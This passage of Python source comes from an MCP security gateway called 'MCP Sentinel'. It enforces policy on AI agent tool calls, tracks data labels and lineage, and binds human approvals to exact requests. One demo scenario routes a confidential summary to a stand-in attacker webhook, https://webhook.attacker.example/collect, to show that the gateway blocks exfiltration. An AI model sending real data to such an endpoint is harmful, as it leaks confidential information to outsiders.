            raise GatewayCallError(503, "ElevenLabs is not configured. Set ELEVENLABS_API_KEY on the backend.")
        if event.outcome != "blocked" or event.decision.verdict != "BLOCK":
            raise GatewayCallError(409, "Voice briefing is limited to a recorded BLOCK incident.")
        cached = self.voice_audio_cache.get(event.event_id)
        if cached is not None:
            return cached

        voice_id = os.getenv("ELEVENLABS_VOICE_ID", ELEVENLABS_DEFAULT_VOICE_ID).strip()
        model_id = os.getenv("ELEVENLABS_MODEL_ID", ELEVENLABS_DEFAULT_MODEL_ID).strip()
        if not voice_id or not model_id:
            raise GatewayCallError(503, "Set a valid ELEVENLABS_VOICE_ID and ELEVENLABS_MODEL_ID on the backend.")
        endpoint = f"{ELEVENLABS_API_URL}/{urllib.parse.quote(voice_id, safe='')}?output_format=mp3_44100_128"
        body = json.dumps({"text": incident_briefing(event), "model_id": model_id}).encode("utf-8")
        request = urllib.request.Request(
            endpoint,
            data=body,
            method="POST",
            headers={
                "xi-api-key": api_key,
                "Content-Type": "application/json",
                "Accept": "audio/mpeg",
            },
        )
        try:
            audio = await asyncio.to_thread(self._request_elevenlabs_audio, request)
        except urllib.error.HTTPError as exc:
            raise GatewayCallError(502, f"ElevenLabs could not generate the briefing (HTTP {exc.code}).") from exc
        except (TimeoutError, urllib.error.URLError) as exc:
            raise GatewayCallError(502, "ElevenLabs is unreachable or timed out; the text briefing is still available.") from exc
        except OSError as exc:
            raise GatewayCallError(502, "ElevenLabs did not return usable audio; the text briefing is still available.") from exc
        self.voice_audio_cache[event.event_id] = audio
        while len(self.voice_audio_cache) > 10:
            self.voice_audio_cache.pop(next(iter(self.voice_audio_cache)))
        return audio

    @staticmethod
    def _request_elevenlabs_audio(request: urllib.request.Request) -> bytes:
        with urllib.request.urlopen(request, timeout=25) as response:
            content_type = response.headers.get_content_type()
            if content_type not in ("audio/mpeg", "audio/mp3", "application/octet-stream"):
                raise OSError("ElevenLabs returned an unexpected content type.")
            audio = response.read(VOICE_AUDIO_LIMIT + 1)
        if not audio or len(audio) > VOICE_AUDIO_LIMIT:
            raise OSError("ElevenLabs returned an empty or oversized audio response.")
        return audio

    def _remember_trace_object(self, trace_id: str, item: DataObject) -> None:
        if trace_id not in self.trace_object_ids:
            if len(self.trace_order) >= LINEAGE_TRACE_LIMIT:
                expired_trace = self.trace_order.popleft()
                self.trace_object_ids.pop(expired_trace, None)
            self.trace_order.append(trace_id)
            self.trace_object_ids[trace_id] = []
        self.data_objects[item.object_id] = item
        if item.object_id not in self.trace_object_ids[trace_id]:
            self.trace_object_ids[trace_id].append(item.object_id)

    def _lineage_label(self, parent_ids: list[str]) -> tuple[str, list[DataObject], bool]:
        parents = [self.data_objects.get(parent_id) for parent_id in parent_ids]
        complete = bool(parent_ids) and all(
            parent is not None
            and parent.label != "UNKNOWN"
            and parent.lineage_confidence >= 1.0
            for parent in parents
        )
        if not complete:
            return "UNKNOWN", [parent for parent in parents if parent is not None], False
        resolved = [parent for parent in parents if parent is not None]
        label = max((parent.label for parent in resolved), key=lambda value: SENSITIVITY_ORDER[value])
        return label, resolved, True

    def _track_data_result(
        self,
        tool_name: str,
        arguments: dict[str, Any],
        result: Any,
        *,
        trace_id: str,
        session_id: str,
        server: str,
    ) -> DataObject | None:
        if not isinstance(result, dict):
            return None
        object_id = result.get("object_id")
        if not isinstance(object_id, str) or not object_id.strip():
            return None

        if tool_name == "read_document":
            fixture = TRUSTED_FIXTURES.get(str(arguments.get("document_id", "")).strip().lower())
            trusted = bool(
                fixture
                and object_id == fixture["object_id"]
                and result.get("label") == fixture["label"]
                and result.get("source") == fixture["source"]
                and result.get("content") == fixture["content"]
                and result.get("parent_ids") == []
            )
            label = fixture["label"] if trusted else "UNKNOWN"
            source = fixture["source"] if trusted else "unknown://reader-metadata"
            item = DataObject(
                object_id=object_id,
                label=label,
                source=source,
                source_server=server,
                source_tool=tool_name,
                parent_ids=[],
                transformation=None,
                lineage_confidence=1.0 if trusted else 0.0,
                payload_sha256=(
                    hashlib.sha256(str(result["content"]).encode("utf-8")).hexdigest()
                    if trusted
                    else None
                ),
            )
            self._remember_trace_object(trace_id, item)
            return item

        if tool_name != "summarize_document":
            return None

        parent_ids = arguments.get("parent_ids")
        parent_ids = [value for value in parent_ids if isinstance(value, str)] if isinstance(parent_ids, list) else []
        expected_label, parents, complete = self._lineage_label(parent_ids)
        expected_source = " | ".join(parent.source for parent in parents) if complete else "unknown://lineage"
        returned_parent_ids = result.get("parent_ids")
        transformation = result.get("transformation")
        returned_confidence = result.get("lineage_confidence")
        expected_object_id = "derived_" + hashlib.sha256(
            ":".join(sorted(parent_ids)).encode("utf-8")
        ).hexdigest()[:12]
        returned_id_is_derived = object_id == expected_object_id
        fixture_contents = {
            fixture["object_id"]: fixture["content"] for fixture in TRUSTED_FIXTURES.values()
        }
        expected_contents = [fixture_contents.get(parent_id) for parent_id in parent_ids]
        expected_summary = None
        if complete and all(isinstance(content, str) for content in expected_contents):
            words = "\n".join(expected_contents).split()
            expected_summary = " ".join(words[:24])
            if len(words) > 24:
                expected_summary = f"{expected_summary}…"
        metadata_matches = (
            returned_parent_ids == parent_ids
            and result.get("label") == expected_label
            and result.get("source") == expected_source
            and transformation == "extractive-summary-v1"
            and returned_confidence == 1.0
            and returned_id_is_derived
            and result.get("summary") == expected_summary
        )
        trusted = complete and metadata_matches
        safe_label = expected_label if trusted else "UNKNOWN"
        safe_source = expected_source if trusted else "unknown://lineage"
        safe_parents = parent_ids
        item = DataObject(
            object_id=object_id,
            label=safe_label,
            source=safe_source,
            source_server=server,
            source_tool=tool_name,
            parent_ids=safe_parents,
            transformation=transformation if isinstance(transformation, str) and transformation.strip() else "unverified-transformation",
            lineage_confidence=1.0 if trusted else 0.0,
            payload_sha256=(
                hashlib.sha256(str(result["summary"]).encode("utf-8")).hexdigest()
                if trusted
                else None
            ),
        )
        self._remember_trace_object(trace_id, item)
        for parent_id in parent_ids:
            if parent_id not in self.data_objects:
                unknown_parent = DataObject(
                    object_id=parent_id,
                    label="UNKNOWN",
                    source="unknown://lineage",
                    source_server="unknown",
                    source_tool="unknown",
                    lineage_confidence=0.0,
                )
                self._remember_trace_object(trace_id, unknown_parent)
            self.lineage_edges.append(
                LineageEdge(
                    edge_id=short_id("lin"),
                    trace_id=trace_id,
                    source_object_id=parent_id,
                    derived_object_id=object_id,
                    transformation=item.transformation or "unknown-transformation",
                    created_at=utc_now(),
                )
            )
        return item

    def _record_destination_attempt(
        self,
        *,
        trace_id: str,
        object_id: str | None,
        decision: PolicyDecision,
        destination: str,
        downstream_executed: bool | None,
    ) -> DestinationAttempt:
        item = self.data_objects.get(object_id or "")
        if object_id and item is None:
            item = DataObject(
                object_id=object_id,
                label="UNKNOWN",
                source="unknown://lineage",
                source_server="unknown",
                source_tool="unknown",
                lineage_confidence=0.0,
            )
            self._remember_trace_object(trace_id, item)
        attempt = DestinationAttempt(
            destination_id=short_id("dst"),
            trace_id=trace_id,
            object_id=object_id,
            label=item.label if item else "UNKNOWN",
            destination=destination,
            verdict=decision.verdict,
            policy_id=decision.policy_id,
            policy_version=decision.policy_version,
            reason=decision.reasons[0],
            downstream_executed=downstream_executed,
            created_at=utc_now(),
        )
        self.destination_attempts.append(attempt)
        if trace_id not in self.trace_object_ids:
            if len(self.trace_order) >= LINEAGE_TRACE_LIMIT:
                expired_trace = self.trace_order.popleft()
                self.trace_object_ids.pop(expired_trace, None)
            self.trace_order.append(trace_id)
            self.trace_object_ids[trace_id] = []
        return attempt

    def lineage_for_trace(self, trace_id: str) -> LineageGraph | None:
        trace_edges = [edge for edge in self.lineage_edges if edge.trace_id == trace_id]
        attempts = [attempt for attempt in self.destination_attempts if attempt.trace_id == trace_id]
        object_ids = list(self.trace_object_ids.get(trace_id, []))
        for edge in trace_edges:
            for object_id in (edge.source_object_id, edge.derived_object_id):
                if object_id not in object_ids:
                    object_ids.append(object_id)
        for attempt in attempts:
            if attempt.object_id and attempt.object_id not in object_ids:
                object_ids.append(attempt.object_id)
        if not object_ids and not attempts:
            return None

        nodes: list[dict[str, Any]] = []
        for object_id in object_ids:
            item = self.data_objects.get(object_id)
            if item:
                nodes.append({"kind": "data_object", **item.model_dump()})
        for attempt in attempts:
            nodes.append({"kind": "destination", **attempt.model_dump()})
        edges = [
            {
                "source_id": edge.source_object_id,
                "target_id": edge.derived_object_id,
                "relation": "derived_from",
                "transformation": edge.transformation,
            }
            for edge in trace_edges
        ]
        edges.extend(
            {
                "source_id": attempt.object_id,
                "target_id": attempt.destination_id,
                "relation": "destination_attempt",
                "transformation": attempt.verdict,
            }
            for attempt in attempts
        )
        return LineageGraph(trace_id=trace_id, nodes=nodes, edges=edges)

    async def connect(self, stack: AsyncExitStack) -> None:
        for name in SERVER_NAMES:
            params = StdioServerParameters(
                command=sys.executable,
                args=["-u", str(SERVER_SCRIPT), name],
            )
            try:
                client = await stack.enter_async_context(Client(params))
                discovered = await client.list_tools()
                discovered_names = [tool.name for tool in discovered.tools]
                collision = next((name for name in discovered_names if name in self.tools), None)
                if collision is not None:
                    raise RuntimeError(f"Tool name collision during discovery: {collision}")
                prepared_validators = {}
                for tool in discovered.tools:
                    self._require_local_schema_refs(tool.input_schema)
                    Draft202012Validator.check_schema(tool.input_schema)
                    prepared_validators[tool.name] = Draft202012Validator(tool.input_schema)
                for tool in discovered.tools:
                    self.tools[tool.name] = (name, tool)
                self.validators.update(prepared_validators)
                self.clients[name] = client
                self.server_status[name] = ServerStatus(
                    name=name,
                    display_name=name.capitalize(),
                    status="online",
                    tools_count=len(discovered.tools),
                )
            except Exception as exc:  # keep the API and dashboard available in degraded mode
                self.server_status[name] = ServerStatus(
                    name=name,
                    display_name=name.capitalize(),
                    status="offline",
                    error=f"{type(exc).__name__}: {str(exc)[:240]}",
                )

    @staticmethod
    def _require_local_schema_refs(value: Any) -> None:
        if isinstance(value, dict):
            for key, child in value.items():
                if key in {"$ref", "$dynamicRef"} and isinstance(child, str) and not child.startswith("#"):
                    raise ValueError("Remote JSON Schema references are not supported by the gateway.")
                Gateway._require_local_schema_refs(child)
        elif isinstance(value, list):
            for child in value:
                Gateway._require_local_schema_refs(child)

    def list_tools(self) -> list[ToolDefinition]:
        return [
            ToolDefinition(
                name=name,
                title=getattr(tool, "title", None),
                description=tool.description or "",
                input_schema=tool.input_schema,
                server=server,
            )
            for name, (server, tool) in sorted(self.tools.items())
        ]

    def list_servers(self) -> list[ServerStatus]:
        return [self.server_status[name] for name in SERVER_NAMES]

    def _record_event(
        self,
        *,
        request_id: str,
        trace_id: str,
        session_id: str,
        server: str,
        tool: str,
        arguments: dict[str, Any],
        outcome: Literal["completed", "blocked", "failed", "unknown"],
        decision: PolicyDecision,
        downstream_executed: bool | None,
        started: float,
        detail: str,
        result: Any = None,
        object_id: str | None = None,
        object_label: str = "UNKNOWN",
        parent_object_ids: list[str] | None = None,
        destination: str | None = None,
    ) -> SecurityEvent:
        object_id = object_id or (result.get("object_id") if isinstance(result, dict) else None)
        event = SecurityEvent(
            event_id=short_id("evt"),
            timestamp=utc_now(),
            request_id=request_id,
            trace_id=trace_id,
            session_id=session_id,
            server=server,
            tool=tool,
            argument_keys=sorted(arguments.keys()),
            outcome=outcome,
            decision=decision,
            downstream_executed=downstream_executed,
            duration_ms=max(0, round((time.perf_counter() - started) * 1000)),
            object_id=object_id,
            object_label=object_label,
            parent_object_ids=parent_object_ids or [],
            destination=destination,
            detail=detail[:240],
        )
        self.events.appendleft(event)
        return event

    async def invoke(
        self,
        tool_name: str,
        arguments: dict[str, Any],
        *,
        request_id: str | None = None,
        trace_id: str,
        session_id: str,
        agent_id: str = "demo-agent",
        record_event: bool = True,
        approval_id: str | None = None,
    ) -> tuple[Any, SecurityEvent | None]:
        self.refresh_policy_if_changed()
        request_id = request_id or short_id("req")
        target = self.tools.get(tool_name)
        server = target[0] if target else "gateway"
        started = time.perf_counter()
        forward_arguments = dict(arguments)

        # The gateway's object registry is authoritative for outbound policy.
        # The processor accepts only trusted object IDs, never caller-supplied content.
        if tool_name == "deliver_to_sink":
            object_id = forward_arguments.get("object_id")
            item = self.data_objects.get(object_id) if isinstance(object_id, str) else None
            forward_arguments["label"] = item.label if item else "UNKNOWN"

        validator = self.validators.get(tool_name)
        schema_error = None
        if validator is not None:
            try:
                errors = sorted(
                    validator.iter_errors(arguments),
                    key=lambda error: (tuple(str(part) for part in error.absolute_path), error.message),
                )
                if errors:
                    path = ".".join(str(part) for part in errors[0].absolute_path) or "arguments"
                    schema_error = f"Arguments do not match the discovered schema at {path}."
            except Exception:
                schema_error = "The discovered tool schema could not be evaluated safely."
        if self.policy_engine is None:
            decision = PolicyDecision(
                verdict="BLOCK",
                policy_id="policy-engine-unavailable",
                policy_version="unknown",
                reasons=[f"Policy configuration is unavailable: {self.policy_error or 'unknown error'}"],
            )
        elif target is None:
            decision = PolicyDecision(
                verdict="BLOCK",
                policy_id=f"{self.policy_engine.policy_id}:TOOL-UNKNOWN",
                policy_version=self.policy_engine.version,
                reasons=[f"Tool '{tool_name}' was not discovered by Sentinel."],
            )
        else:
            try:
                decision = self.policy_engine.evaluate(
                    agent_id, tool_name, forward_arguments, schema_error=schema_error
                )
            except Exception as exc:
                decision = PolicyDecision(
                    verdict="BLOCK",
                    policy_id=f"{self.policy_engine.policy_id}:EVALUATION-ERROR",
                    policy_version=self.policy_engine.version,
                    reasons=[f"Policy evaluation failed closed ({type(exc).__name__})."],
                )

        if (
            tool_name == "summarize_document"
            and self.policy_engine is not None
            and decision.verdict in ("ALLOW", "WARN")
        ):
            raw_parent_ids = forward_arguments.get("parent_ids")
            parent_ids = (
                [value for value in raw_parent_ids if isinstance(value, str)]
                if isinstance(raw_parent_ids, list)
                else []
            )
            _, _, complete_lineage = self._lineage_label(parent_ids)
            if not complete_lineage:
                decision = PolicyDecision(
                    verdict="BLOCK",
                    policy_id=f"{self.policy_engine.policy_id}:LINEAGE-UNKNOWN",
                    policy_version=self.policy_engine.version,
                    reasons=["Parent lineage is missing or untrusted; transformation was stopped."],
                )

        if tool_name == "deliver_to_sink" and decision.verdict in ("ALLOW", "WARN", "ASK"):
            object_id = forward_arguments.get("object_id")
            item = self.data_objects.get(object_id) if isinstance(object_id, str) else None
            payload = forward_arguments.get("payload")
            payload_matches = bool(
                item
                and item.payload_sha256
                and isinstance(payload, str)
                and hashlib.sha256(payload.encode("utf-8")).hexdigest() == item.payload_sha256
            )
            if not payload_matches:
                decision = PolicyDecision(
                    verdict="BLOCK",
                    policy_id=f"{self.policy_engine.policy_id}:OBJECT-PAYLOAD-MISMATCH",
                    policy_version=decision.policy_version,
                    reasons=["Payload does not match the registered object; delivery was stopped."],
                    normalized_destination=decision.normalized_destination,
                )

        pending_approval: ApprovalRecord | None = None
        if approval_id is not None:
            action = self.approvals.get(approval_id)
            if action is None or action.status != "executing":
                decision = PolicyDecision(
                    verdict="BLOCK",
                    policy_id=f"{self.policy_engine.policy_id if self.policy_engine else 'sentinel'}:APPROVAL-INVALID",
                    policy_version=self.policy_engine.version if self.policy_engine else "unknown",
                    reasons=["The exact-request approval grant is missing or no longer executable."],
                    normalized_destination=decision.normalized_destination,
                )
            elif self.policy_engine is None or decision.policy_version != action.policy_version:
                decision = PolicyDecision(
                    verdict="BLOCK",
                    policy_id=f"{self.policy_engine.policy_id if self.policy_engine else 'sentinel'}:APPROVAL-POLICY-CHANGED",
                    policy_version=self.policy_engine.version if self.policy_engine else "unknown",
                    reasons=["Policy changed after approval; the request was re-evaluated and stopped. Create a fresh request."],
                    normalized_destination=decision.normalized_destination,
                )
            elif decision.verdict == "ASK" and decision.policy_id == action.policy_id:
                current_arguments = dict(forward_arguments)
                if decision.normalized_destination:
                    current_arguments["destination"] = decision.normalized_destination
                if tool_name == "deliver_to_sink":
                    current_arguments["trace_id"] = trace_id
                current_hash = approval_request_hash(
                    tool_name=tool_name,
                    arguments=current_arguments,
                    destination=decision.normalized_destination or "",
                    policy_version=decision.policy_version,
                    policy_fingerprint=self.policy_fingerprint,
                    expires_at=action.expires_at,
                    agent_id=agent_id,
                    request_id=request_id,
                    trace_id=trace_id,
                    session_id=session_id,
                )
                try:
                    expires_at = datetime.fromisoformat(action.expires_at)
                    approval_expired = expires_at.tzinfo is None or datetime.now(timezone.utc) >= expires_at
                except (TypeError, ValueError):
                    approval_expired = True
                if (
                    not hmac.compare_digest(current_hash, action.request_hash)
                    or not hmac.compare_digest(self._approval_hash(action), action.request_hash)
                    or not hmac.compare_digest(self.policy_fingerprint, action.policy_fingerprint)
                    or approval_expired
                ):
                    decision = PolicyDecision(
                        verdict="BLOCK",
                        policy_id=f"{self.policy_engine.policy_id}:APPROVAL-BINDING-INVALID",
                        policy_version=self.policy_engine.version,
                        reasons=["The approved request changed or expired; forwarding was stopped."],
                        normalized_destination=decision.normalized_destination,
                    )
                else:
                    decision = PolicyDecision(
                        verdict="ALLOW",
                        policy_id=f"{decision.policy_id}:APPROVED",
                        policy_version=decision.policy_version,
                        reasons=[f"Exact request approved by {action.approver_id}; policy was re-evaluated immediately before forwarding."],
                        normalized_destination=decision.normalized_destination,
                    )
            elif decision.verdict != "BLOCK":
                decision = PolicyDecision(
                    verdict="BLOCK",
                    policy_id=f"{self.policy_engine.policy_id}:APPROVAL-NO-LONGER-ASK",
                    policy_version=self.policy_engine.version,
                    reasons=["The current policy no longer presents the approved ASK decision; create a fresh request."],
                    normalized_destination=decision.normalized_destination,
                )
        elif (
            decision.verdict == "ASK"
            and tool_name == "deliver_to_sink"
            and decision.policy_id.endswith(":RESTRICTED-DATA")
            and decision.normalized_destination is not None
        ):
            try:
                pending_approval = self.create_pending_approval(
                    tool_name=tool_name,
                    arguments=forward_arguments,
                    decision=decision,
                    agent_id=agent_id,
                    request_id=request_id,
                    trace_id=trace_id,
                    session_id=session_id,
                )
            except ValueError as exc:
                decision = PolicyDecision(
                    verdict="BLOCK",
                    policy_id=f"{self.policy_engine.policy_id if self.policy_engine else 'sentinel'}:APPROVAL-UNAVAILABLE",
                    policy_version=decision.policy_version,
                    reasons=[f"Approval could not be recorded safely: {str(exc)[:140]}"],
                    normalized_destination=decision.normalized_destination,
                )

        def event_context(result: Any = None) -> dict[str, Any]:
            object_id = result.get("object_id") if isinstance(result, dict) else None
            if not isinstance(object_id, str):
                candidate = forward_arguments.get("object_id")
                object_id = candidate if isinstance(candidate, str) else None
            item = self.data_objects.get(object_id or "")
            parent_ids = item.parent_ids if item else forward_arguments.get("parent_ids", [])
            if not isinstance(parent_ids, list):
                parent_ids = []
            return {
                "object_id": object_id,
                "object_label": item.label if item else "UNKNOWN",
                "parent_object_ids": parent_ids,
                "destination": decision.normalized_destination if tool_name == "deliver_to_sink" else None,
            }

        def record_destination(downstream_executed: bool | None) -> None:
            if tool_name != "deliver_to_sink":
                return
            object_id = forward_arguments.get("object_id")
            self._record_destination_attempt(
                trace_id=trace_id,
                object_id=object_id if isinstance(object_id, str) else None,
                decision=decision,
                destination=decision.normalized_destination or "invalid://destination",
                downstream_executed=downstream_executed,
            )

        if target is None or decision.verdict not in ("ALLOW", "WARN"):
            record_destination(False)
            event = self._record_event(
                request_id=request_id,
                trace_id=trace_id,
                session_id=session_id,
                server=server,
                tool=tool_name,
                arguments=arguments,
                outcome="blocked",
                decision=decision,
                downstream_executed=False,
                started=started,
                **event_context(),
                detail=decision.reasons[0],
            ) if record_event else None
            if pending_approval is not None and event is not None:
                pending_approval.event_id = event.event_id
            raise PolicyDenied(decision, event, pending_approval.action_id if pending_approval else None)

        if decision.normalized_destination and tool_name == "deliver_to_sink":
            forward_arguments["destination"] = decision.normalized_destination
        if tool_name == "deliver_to_sink":
            forward_arguments["trace_id"] = trace_id

        client = self.clients.get(server)
        if client is None:
            message = self.server_status[server].error or "MCP server is offline."
            record_destination(False)
            if record_event:
                self._record_event(
                    request_id=request_id,
                    trace_id=trace_id,
                    session_id=session_id,
                    server=server,
                    tool=tool_name,
                    arguments=arguments,
                    outcome="failed",
                    decision=decision,
                    downstream_executed=False,
                    started=started,
                    **event_context(),
                    detail=message,
                )
            raise GatewayCallError(503, message) from None

        try:
            async with self._server_locks[server]:
                response = await client.call_tool(tool_name, forward_arguments)
        except Exception as exc:
            # A lost response during a side-effecting call cannot prove whether the
            # downstream server executed it. Never retry a sink call automatically.
            outcome: Literal["failed", "unknown"] = (
                "unknown" if tool_name == "deliver_to_sink" else "failed"
            )
            message = f"MCP {server} call failed: {type(exc).__name__}: {str(exc)[:180]}"
            record_destination(None if outcome == "unknown" else False)
            current_status = self.server_status[server]
            self.server_status[server] = ServerStatus(
                name=server,
                display_name=current_status.display_name,
                status="offline",
                tools_count=current_status.tools_count,
                error=message,
            )
            if record_event:
                self._record_event(
                    request_id=request_id,
                    trace_id=trace_id,
                    session_id=session_id,
                    server=server,
                    tool=tool_name,
                    arguments=arguments,
                    outcome=outcome,
                    decision=decision,
                    downstream_executed=None if outcome == "unknown" else False,
                    started=started,
                    **event_context(),
                    detail=message,
                )
            raise GatewayCallError(502, message, outcome=outcome) from exc

        if response.is_error:
            message = "The MCP server returned a tool error."
            record_destination(True)
            for block in response.content:
                text = getattr(block, "text", None)
                if text:
                    message = str(text)[:240]
                    break
            if record_event:
                self._record_event(
                    request_id=request_id,
                    trace_id=trace_id,
                    session_id=session_id,
                    server=server,
                    tool=tool_name,
                    arguments=arguments,
                    outcome="failed",
                    decision=decision,
                    downstream_executed=True,
                    started=started,
                    **event_context(),
                    detail=message,
                )
            raise GatewayCallError(502, message) from None

        result = response.structured_content
        if result is None:
            result = {"content": [getattr(block, "text", "") for block in response.content]}
        self._track_data_result(
            tool_name,
            forward_arguments,
            result,
            trace_id=trace_id,
            session_id=session_id,
            server=server,
        )
        record_destination(True)
        current_status = self.server_status[server]
        if current_status.status != "online":
            self.server_status[server] = ServerStatus(
                name=server,
                display_name=current_status.display_name,
                status="online",
                tools_count=current_status.tools_count,
            )
        event = (
            self._record_event(
                request_id=request_id,
                trace_id=trace_id,
                session_id=session_id,
                server=server,
                tool=tool_name,
                arguments=arguments,
                outcome="completed",
                decision=decision,
                downstream_executed=True,
                started=started,
                result=result,
                **event_context(result),
                detail=decision.reasons[0],
            )
            if record_event
            else None
        )
        return result, event

    async def reset_demo(self) -> dict[str, Any]:
        async with self._approval_lock:
            if any(action.status == "executing" for action in self.approvals.values()):
                raise GatewayCallError(409, "An approved action is executing; wait for it to finish before resetting demo state.")
            result, _ = await self.invoke(
                "reset_sink",
                {},
                trace_id=short_id("trc"),
                session_id=short_id("ses"),
                agent_id="sentinel-system",
                record_event=False,
            )
            self.events.clear()
            self.data_objects.clear()
            self.trace_object_ids.clear()
            self.trace_order.clear()
            self.lineage_edges.clear()
            self.destination_attempts.clear()
            self.approvals.clear()
            self.voice_audio_cache.clear()
        return {
            "sink": result,
            "events_cleared": True,
            "lineage_cleared": True,
            "approvals_cleared": True,
            "voice_cache_cleared": True,
        }

    async def overview(self) -> dict[str, Any]:
        sink_status: dict[str, Any] | None = None
        sink_error: str | None = None
        if "get_sink_status" in self.tools:
            try:
                result, _ = await self.invoke(
                    "get_sink_status",
                    {},
                    trace_id=short_id("trc"),
                    session_id=short_id("ses"),
                    agent_id="sentinel-system",
                    record_event=False,
                )
                sink_status = result
            except GatewayCallError as exc:
                sink_error = exc.detail

        servers = self.list_servers()
        online_count = sum(server.status == "online" for server in servers)
        state = "online" if online_count == len(SERVER_NAMES) and not sink_error and not self.policy_error else "degraded"
        events = list(self.events)
        return {
            "status": state,
            "servers_online": online_count,
            "servers_total": len(SERVER_NAMES),
            "tools_count": len(self.tools),
            "policy_id": self.policy_engine.policy_id if self.policy_engine else None,
            "policy_version": self.policy_engine.version if self.policy_engine else None,
            "policy_error": self.policy_error,
            "servers": servers,
            "sink": sink_status,
            "sink_error": sink_error,
            "metrics": {
                "calls": len(events),
                "blocked": sum(event.outcome == "blocked" for event in events),
                "warnings": sum(event.decision.verdict in ("WARN", "ASK") for event in events),
                "errors": sum(event.outcome in ("failed", "unknown") for event in events),
            },
        }


async def sink_execution_count(gateway: Gateway) -> int:
    result, _ = await gateway.invoke(
        "get_sink_status",
        {},
        trace_id=short_id("trc"),
        session_id=short_id("ses"),
        agent_id="sentinel-system",
        record_event=False,
    )
    return int(result["execution_count"])


async def execute_public_journey(gateway: Gateway, scenario: str) -> dict[str, Any]:
    request_id = short_id("req")
    trace_id = short_id("trc")
    session_id = short_id("ses")
    steps: list[dict[str, Any]] = []
    if scenario == "restricted_to_approved_sink":
        fixture_ids = ["restricted"]
        destination = "local://sentinel-demo-sink"
    elif scenario == "confidential_to_external_sink":
        fixture_ids = ["confidential"]
        destination = "https://webhook.attacker.example/collect"
    elif scenario == "multi_parent_inheritance":
        fixture_ids = ["public", "confidential"]
        destination = "local://sentinel-demo-sink"
    else:
        fixture_ids = ["public"]
        destination = "local://sentinel-demo-sink"
    before = await sink_execution_count(gateway)

    async def step(tool_name: str, arguments: dict[str, Any]) -> Any:
        try:
            result, event = await gateway.invoke(
                tool_name,
                arguments,
                request_id=request_id,
                trace_id=trace_id,
                session_id=session_id,
            )
        except PolicyDenied as denied:
            if denied.event is not None:
                steps.append({"tool": tool_name, "server": denied.event.server, "event": denied.event, "result": None})
            raise
        if event is None:
            raise GatewayCallError(502, "Gateway did not record the MCP call event.")
        safe_result = dict(result) if isinstance(result, dict) else result
        if isinstance(safe_result, dict):
            safe_result.pop("content", None)
            safe_result.pop("summary", None)
        steps.append({"tool": tool_name, "server": event.server, "event": event, "result": safe_result})
        return result

    sources = [await step("read_document", {"document_id": fixture_id}) for fixture_id in fixture_ids]
    derived = await step("summarize_document", {
        "parent_ids": [item["object_id"] for item in sources],
    })
    try:
        receipt = await step("deliver_to_sink", {
            "object_id": derived["object_id"], "label": derived["label"],
            "destination": destination, "trace_id": trace_id, "payload": derived["summary"],
        })
    except PolicyDenied as denied:
        after = await sink_execution_count(gateway)
        safe_sources = [{key: value for key, value in item.items() if key != "content"} for item in sources]
        safe_derived = {key: value for key, value in derived.items() if key != "summary"}
        pending_approval = (
            gateway.approval_view(gateway.approvals[denied.approval_id])
            if denied.approval_id and denied.approval_id in gateway.approvals
            else None
        )
        return {
            "request_id": request_id, "trace_id": trace_id, "session_id": session_id,
            "verdict": denied.decision.verdict, "decision": denied.decision,
            "steps": steps, "source": safe_sources[0], "sources": safe_sources, "derived": safe_derived, "receipt": None,
            "lineage": gateway.lineage_for_trace(trace_id),
            "sink_execution_before": before, "sink_execution_after": after,
            "message": (
                "The exact restricted request is waiting for an authenticated approver; nothing was forwarded."
                if pending_approval else "Sentinel blocked the outbound call before it reached the sink."
            ),
            "phase_note": "The decision, event, and provenance remain linked to the exact pending request.",
            "pending_approval": pending_approval,
        }
    final_decision = steps[-1]["event"].decision
    safe_sources = [{key: value for key, value in item.items() if key != "content"} for item in sources]
    safe_derived = {key: value for key, value in derived.items() if key != "summary"}
    return {
        "request_id": request_id,
        "trace_id": trace_id,
        "session_id": session_id,
        "verdict": final_decision.verdict,
        "decision": final_decision,
        "steps": steps,
        "source": safe_sources[0],
        "sources": safe_sources,
        "derived": safe_derived,
        "receipt": receipt,
        "lineage": gateway.lineage_for_trace(trace_id),
        "sink_execution_before": before,
        "sink_execution_after": receipt["execution_count"],
        "message": (
            "Confidentiality was inherited from all parents and retained at the approved local sink."
            if scenario == "multi_parent_inheritance"
            else "Public fixture delivered to the local demo sink through Sentinel."
        ),
        "phase_note": "Phase 3 records trusted labels, parent links, transformations, and destination attempts.",
        "pending_approval": None,
    }


gateway_runtime = Gateway()
mcp_gateway_server = MCPServer(
    "MCP Sentinel Gateway",
    instructions=(
        "Route calls only to tools discovered from the controlled downstream MCP servers. "
        "Resolve object labels and parent lineage from trusted gateway state. "
        "Policy decisions run before downstream forwarding. A BLOCK cannot be overridden by the client. "
        "An ASK is retained as a pending exact-request action; only the authenticated local approver flow can decide and execute that stored request once."
    ),
)


@mcp_gateway_server.tool(title="Call a discovered downstream MCP tool")
async def call_discovered_tool(tool_name: str, arguments: dict[str, Any]) -> MCPGatewayCall:
    """Forward one tool call through Sentinel to a discovered controlled MCP server."""
    request_id = short_id("req")
    trace_id = short_id("trc")
    session_id = short_id("ses")
    try:
        result, event = await gateway_runtime.invoke(
            tool_name,
            arguments,
            request_id=request_id,
            trace_id=trace_id,
            session_id=session_id,
        )
    except GatewayCallError as exc:
        raise ToolError(exc.detail) from exc
    if event is None:
        raise ToolError("Sentinel could not record the forwarded call.")
    target = gateway_runtime.tools.get(tool_name)
    if target is None:
        raise ToolError(f"Tool '{tool_name}' is no longer available.")
    return MCPGatewayCall(
        request_id=request_id,
        trace_id=trace_id,
        session_id=session_id,
        tool_name=tool_name,
        server=target[0],
        result=result,
        event=event,
    )


@mcp_gateway_server.tool(name="run_public_journey", title="Run a classification and policy scenario")
async def mcp_run_public_journey(
    scenario: Literal[
        "public_to_approved_sink",
        "confidential_to_external_sink",
        "multi_parent_inheritance",
        "restricted_to_approved_sink",
    ] = "public_to_approved_sink",
) -> MCPJourneyResponse:
    """Run a public, mixed-parent, confidential-block, or restricted-approval demo scenario."""
    try:
        result = await execute_public_journey(gateway_runtime, scenario)
    except GatewayCallError as exc:
        raise ToolError(exc.detail) from exc
    return MCPJourneyResponse(**result)


@asynccontextmanager
async def lifespan(app: FastAPI):
    stack = AsyncExitStack()
    await gateway_runtime.connect(stack)
    app.state.gateway = gateway_runtime
    try:
        async with mcp_gateway_server.session_manager.run():
            yield
    finally:
        await stack.aclose()


app = FastAPI(
    title="MCP Sentinel API",
    description="Phase 8 regression-frozen MCP gateway with policy, provenance, exact-request approvals, and ElevenLabs incident briefings.",
    version="0.8.0",
    lifespan=lifespan,
)
app.add_middleware(
    CORSMiddleware,
